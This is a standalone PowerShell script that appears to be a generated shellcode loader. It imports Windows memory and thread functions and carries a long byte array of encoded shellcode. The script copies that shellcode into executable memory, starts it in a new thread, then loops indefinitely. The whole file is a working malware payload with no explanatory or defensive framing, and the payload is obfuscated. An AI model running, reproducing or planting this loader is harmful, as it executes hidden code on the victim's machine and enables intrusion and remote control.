$Qao = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Qao -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x80,0xf7,0x90,0xf2,0xd9,0xd0,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x57,0x31,0x46,0x12,0x83,0xee,0xfc,0x03,0xc6,0xf9,0x72,0x07,0x3a,0xed,0xf1,0xe8,0xc2,0xee,0x95,0x61,0x27,0xdf,0x95,0x16,0x2c,0x70,0x26,0x5c,0x60,0x7d,0xcd,0x30,0x90,0xf6,0xa3,0x9c,0x97,0xbf,0x0e,0xfb,0x96,0x40,0x22,0x3f,0xb9,0xc2,0x39,0x6c,0x19,0xfa,0xf1,0x61,0x58,0x3b,0xef,0x88,0x08,0x94,0x7b,0x3e,0xbc,0x91,0x36,0x83,0x37,0xe9,0xd7,0x83,0xa4,0xba,0xd6,0xa2,0x7b,0xb0,0x80,0x64,0x7a,0x15,0xb9,0x2c,0x64,0x7a,0x84,0xe7,0x1f,0x48,0x72,0xf6,0xc9,0x80,0x7b,0x55,0x34,0x2d,0x8e,0xa7,0x71,0x8a,0x71,0xd2,0x8b,0xe8,0x0c,0xe5,0x48,0x92,0xca,0x60,0x4a,0x34,0x98,0xd3,0xb6,0xc4,0x4d,0x85,0x3d,0xca,0x3a,0xc1,0x19,0xcf,0xbd,0x06,0x12,0xeb,0x36,0xa9,0xf4,0x7d,0x0c,0x8e,0xd0,0x26,0xd6,0xaf,0x41,0x83,0xb9,0xd0,0x91,0x6c,0x65,0x75,0xda,0x81,0x72,0x04,0x81,0xcd,0xea,0x72,0x4d,0x0e,0x9b,0x0b,0xc4,0x60,0x32,0xa0,0x7e,0x31,0xb3,0x6e,0x79,0x36,0xee,0x5e,0x5e,0x9b,0x42,0xf2,0x33,0x4f,0x0d,0xce,0xe5,0x16,0x6a,0xd1,0xdc,0xba,0x27,0x44,0xdd,0x6f,0x9b,0xf0,0x1a,0xaf,0x1b,0x01,0x34,0x3c,0x1b,0x01,0xc4,0x12,0x72,0x65,0xf4,0x41,0xa7,0x65,0xa4,0xf1,0xe0,0xec,0xdb,0xc4,0xf0,0x3a,0x6a,0x0e,0x5d,0xad,0x6c,0xbd,0x82,0xa9,0x3f,0x92,0x11,0xe5,0xec,0x42,0xfe,0xe2,0x47,0x45,0xc5,0x0b,0xb2,0x0f,0x53,0xfe,0x63,0x58,0x24,0xcd,0x9b,0x98,0xad,0xd2,0xf1,0x9c,0xfd,0x78,0x1a,0xcb,0x95,0x09,0x62,0x6d,0xe3,0x0d,0xbf,0xc2,0xbf,0xa2,0x6c,0xb3,0x57,0x68,0x94,0x23,0xd3,0x8d,0x4d,0xd6,0xe3,0x07,0x67,0x96,0x96,0x3e,0x1f,0xd8,0xec,0x63,0x89,0xe7,0xda,0x0e,0x75,0x70,0xe5,0xde,0x75,0x80,0x8d,0xde,0x75,0xc0,0x4d,0x8c,0x1d,0x98,0xe9,0x61,0x38,0xe7,0x27,0x16,0x91,0x4b,0x41,0xfe,0x42,0x04,0x51,0x21,0x6c,0xd4,0x02,0x77,0x04,0xc6,0x32,0xfe,0x36,0x19,0xef,0x84,0x76,0x92,0xdd,0x0c,0x71,0x5a,0x1d,0x97,0xbd,0x29,0x44,0xc0,0xfe,0x8d,0x6e,0x84,0xff,0xcd,0x90,0x56,0xc8,0x03,0x41,0xab,0x04,0x4a,0xa8,0xe5,0x59,0xa0,0xe1,0xf9;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$2Nup=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($2Nup.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$2Nup,0,0,0);for (;;){Start-sleep 60};